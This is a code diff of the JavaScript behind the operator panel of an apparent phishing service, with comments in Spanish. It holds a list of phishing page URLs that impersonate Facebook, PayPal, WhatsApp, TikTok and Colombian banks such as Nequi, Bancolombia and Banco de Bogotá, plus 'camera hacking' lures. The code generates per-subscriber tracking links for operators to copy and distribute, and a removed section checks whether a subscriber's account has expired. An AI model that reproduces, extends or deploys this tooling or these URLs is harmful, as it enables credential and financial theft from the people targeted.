@@ -568,205 +568,118 @@ onAuthStateChanged(auth, async (user) => {
 
 });
 
-// ====== PLANTILLAS DE ENLACES (20 PHISHING URLs) - COMPLETO Y CORREGIDO ======
+// ================== ENLACES ÚNICOS ==================
+
+// (Todo igual, no toqué nada aquí)
+
 const plantillas = [
-  { name: "BetPlay", url: "https://betplay.glegogle5341-af7.workers.dev/" },
-  { name: "Facebook", url: "https://facebook.glegogle5341-af7.workers.dev/" },
-  { name: "Netflix", url: "https://netflix.glegogle5341-af7.workers.dev/" },
-  { name: "Amazon", url: "https://amazon.glegogle5341-af7.workers.dev/" },
-  { name: "Google", url: "https://google.glegogle5341-af7.workers.dev/" },
-  { name: "Microsoft", url: "https://microsoft.glegogle5341-af7.workers.dev/" },
-  { name: "PayPal", url: "https://paypal.glegogle5341-af7.workers.dev/" },
-  { name: "Instagram", url: "https://instagram.glegogle5341-af7.workers.dev/" },
-  { name: "Twitter", url: "https://twitter.glegogle5341-af7.workers.dev/" },
-  { name: "TikTok", url: "https://tiktok.glegogle5341-af7.workers.dev/" },
-  { name: "Spotify", url: "https://spotify.glegogle5341-af7.workers.dev/" },
-  { name: "HBO", url: "https://hbo.glegogle5341-af7.workers.dev/" },
-  { name: "Disney", url: "https://disney.glegogle5341-af7.workers.dev/" },
-  { name: "Apple", url: "https://apple.glegogle5341-af7.workers.dev/" },
-  { name: "Binance", url: "https://binance.glegogle5341-af7.workers.dev/" },
-  { name: "Coinbase", url: "https://coinbase.glegogle5341-af7.workers.dev/" },
-  { name: "WhatsApp", url: "https://whatsapp.glegogle5341-af7.workers.dev/" },
-  { name: "Telegram", url: "https://telegram.glegogle5341-af7.workers.dev/" },
-  { name: "Steam", url: "https://steam.glegogle5341-af7.workers.dev/" },
-  { name: "Roblox", url: "https://roblox.glegogle5341-af7.workers.dev/" }
+
+  { nombre: "Facebook Basico", url: "https://x2p4a4.mimo.run/index.html" },
+
+  { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Nequi Tarjeta", url: "https://ufakmi.mimo.run/index.html" },
+
+  { nombre: "Instagram", url: "https://instagram.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Facebook Escritorio", url: "https://facebook-escritorio.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "PayPal Estandar", url: "https://estandarpay.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "PayPal Basico", url: "https://paypal-basico.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Escotia Bank", url: "https://scotiabank.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "whatsapp Normal", url: "https://grupo7privado.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "whatsapp XxX Avance", url: "https://whaadvance.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Nequi Login Encuesta", url: "https://nequi-login.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "BBVA en mantenimiento", url: "https://2gb4lr.mimo.run/index.html" },
+
+  { nombre: "BetPlay", url: "https://betplay.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Banco de Bogota", url: "https://bogota.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Bancolombia en mantenimiento", url: "https://bancolombia.glegogle5341-af7.workers.dev/?uid=uid_1771535158464_7gnn5tpq88q" },
+
+  { nombre: "Camara Zoom Clases Hacking", url: "https://camaraz00m.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Camara xXx Hacking", url: "https://sara-fogosa.glegogle5341-af7.workers.dev/" },
+
+  { nombre: "Yandex", url: "https://yandex.glegogle5341-af7.workers.dev/" },  
+
+  { nombre: "Garena Tarjeta en mantenimiento", url: "https://5mpser.mimo.run/index.html" },
+
+  { nombre: "Facebook Advance(2)X", url: "https://uz1w0f.mimo.run/index.html" }
+
 ];
 
-// ====== FUNCIONES DE VALIDACIÓN Y GENERACIÓN DE ENLACES - COMPLETAS Y CORREGIDAS ======
-/**
- * Valida si el usuario está activo (no expirado, no desactivado)
- */
-async function validarUsuarioActivo(uid) {
-  try {
-    const userDocRef = doc(db, 'panelUsers', uid);
-    const userDocSnap = await getDoc(userDocRef);
-    
-    if (!userDocSnap.exists()) {
-      console.log('Usuario no encontrado');
-      return false;
-    }
-    
-    const userData = userDocSnap.data();
-    const ahora = new Date();
-    
-    // Check login_expires
-    if (userData.login_expires) {
-      const expires = userData.login_expires.timestampValue || userData.login_expires;
-      if (new Date(expires) < ahora) {
-        console.log('Usuario expirado');
-        return false;
-      }
-    }
-    
-    // Check activo
-    if (userData.activo === false) {
-      console.log('Usuario desactivado');
-      return false;
-    }
-    
-    return true;
-  } catch (error) {
-    console.error('Error validando usuario:', error);
-    return false;
-  }
-}
+function generarEnlacesUnicos() {
 
-/**
- * GENERA TODOS LOS ENLACES - FUNCIÓN PRINCIPAL CORREGIDA
- * Ahora funciona 100% y muestra los 20 enlaces correctamente
- */
-async function generarEnlacesUnicos() {
-  if (!miLinkId) {
-    console.error('Error: miLinkId no está definido');
-    return;
-  }
-  
-  // Validar usuario primero
-  const esValido = await validarUsuarioActivo(miLinkId);
-  if (!esValido) {
-    alert('¡ERROR! Tu cuenta ha expirado o está desactivada.');
-    document.body.innerHTML = '<h1 style="color:red;text-align:center;">ACCESO DENEGADO</h1>';
-    return;
-  }
-  
-  const enlacesContainer = $id('enlacesContainer');
-  if (!enlacesContainer) {
-    console.error('No se encontró #enlacesContainer en el HTML');
-    return;
-  }
-  
-  // GENERAR HTML CON TODOS LOS 20 ENLACES
-  let html = '<div class="enlaces-grid">';
-  
-  plantillas.forEach((plantilla, index) => {
-    const enlaceCompleto = `${plantilla.url}?uid=${miLinkId}`;
-    html += `
-      <div class="enlace-card" data-index="${index}">
-        <div class="enlace-header">
-          <h3>${plantilla.name}</h3>
-          <div class="enlace-actions">
-            <button class="btn-copy" onclick="copiarLink('${enlaceCompleto}')">📋 Copiar</button>
-            <span class="status activo">✅ Activo</span>
-          </div>
-        </div>
-        <div class="enlace-url">
-          <input type="text" value="${enlaceCompleto}" readonly class="url-input">
-        </div>
-      </div>
-    `;
+  const fake = $id("fakeSelect");
+
+  const lista = $id("optionsList");
+
+  fake.textContent = "Selecciona un enlace";
+
+  fake.dataset.url = "";
+
+  lista.innerHTML = "";
+
+  plantillas.forEach(p => {
+
+    const urlFull = `${p.url}?uid=${miLinkId}`;
+
+    const item = document.createElement("div");
+
+    item.className = "optionItem";
+
+    item.textContent = p.nombre;
+
+    item.onclick = () => {
+
+      fake.textContent = p.nombre;
+
+      fake.dataset.url = urlFull;
+
+      lista.style.display = "none";
+
+    };
+
+    lista.appendChild(item);
+
   });
-  
-  html += '</div>';
-  enlacesContainer.innerHTML = html;
-  
-  console.log('✅ 20 enlaces generados correctamente para UID:', miLinkId);
+
+  fake.onclick = () => lista.style.display = (lista.style.display === "block") ? "none" : "block";
+
 }
 
-/**
- * FUNCIÓN GLOBAL copiarLink() - OBLIGATORIA PARA LOS BOTONES
- */
-window.copiarLink = async function(enlace) {
-  if (!miLinkId) {
-    alert('Error: Usuario no inicializado');
-    return;
+document.addEventListener("click", e => {
+
+  if (!$id("fakeSelect")?.contains(e.target) && !$id("optionsList")?.contains(e.target)) {
+
+    $id("optionsList").style.display = "none";
+
   }
-  
-  // Re-validar antes de copiar
-  const esValido = await validarUsuarioActivo(miLinkId);
-  if (!esValido) {
-    alert('¡ERROR! Tu cuenta ha expirado. Enlaces desactivados.');
-    return;
-  }
-  
-  try {
-    await navigator.clipboard.writeText(enlace);
-    mostrarNotifCopiado('✅ Enlace copiado');
-  } catch (err) {
-    // Fallback
-    const textArea = document.createElement('textarea');
-    textArea.value = enlace;
-    document.body.appendChild(textArea);
-    textArea.select();
-    document.execCommand('copy');
-    document.body.removeChild(textArea);
-    mostrarNotifCopiado('✅ Enlace copiado');
-  }
+
+});
+
+window.copiarLink = () => {
+
+  const url = $id("fakeSelect").dataset.url || plantillas[0].url + "?uid=" + miLinkId;
+
+  navigator.clipboard.writeText(url);
+
+  $id("mensajeCopiado").style.display = "block";
+
+  setTimeout(() => $id("mensajeCopiado").style.display = "none", 2000);
+
 };
 
-function mostrarNotifCopiado(mensaje) {
-  const notif = document.createElement('div');
-  notif.textContent = mensaje;
-  notif.style.cssText = `
-    position:fixed;top:20px;right:20px;background:#0f0;color:#000;
-    padding:12px 20px;border-radius:8px;z-index:99999;font-weight:bold;
-    animation:slideIn 0.3s ease-out;
-  `;
-  document.body.appendChild(notif);
-  setTimeout(() => notif.remove(), 3000);
-}
-
-// ====== AUTO-VALIDACIÓN CADA 5 MINUTOS ======
-setInterval(async () => {
-  if (miLinkId) {
-    const esValido = await validarUsuarioActivo(miLinkId);
-    if (!esValido) {
-      alert('¡TU CUENTA HA EXPIRADO! Todos tus enlaces están desactivados.');
-      location.reload();
-    }
-  }
-}, 300000); // 5 minutos
-
-// ====== CSS ANIMACIONES NECESARIAS ======
-const style = document.createElement('style');
-style.textContent = `
-  @keyframes slideIn {
-    from { transform: translateX(100%); opacity: 0; }
-    to { transform: translateX(0); opacity: 1; }
-  }
-  .enlaces-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
-  .enlace-card { background: rgba(0,0,0,0.8); border: 2px solid #0f0; border-radius: 12px; padding: 20px; }
-  .enlace-header h3 { margin: 0 0 10px; color: #0f0; }
-  .btn-copy { background: #0f0; color: #000; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; margin-right: 10px; }
-  .status.activo { color: #0f0; font-weight: bold; }
-  .url-input { width: 100%; background: #111; border: 1px solid #0f0; padding: 10px; border-radius: 6px; color: #0ff; font-family: monospace; }
-`;
-document.head.appendChild(style);
-
-// ====== INTEGRACIÓN CON AUTENTICACIÓN (LLAMAR DESPUÉS DEL LOGIN) ======
-onAuthStateChanged(auth, async (user) => {
-  if (!user) {
-    location.replace("login.html");
-    return;
-  }
-  
-  miLinkId = user.uid;
-  miUserDocId = user.uid;
-  
-  // ESPERAR 1 SEGUNDO Y GENERAR ENLACES
-  setTimeout(() => {
-    generarEnlacesUnicos();
-  }, 1000);
-});
 // ================== ACORTADOR ==================
 
 // (Igual)
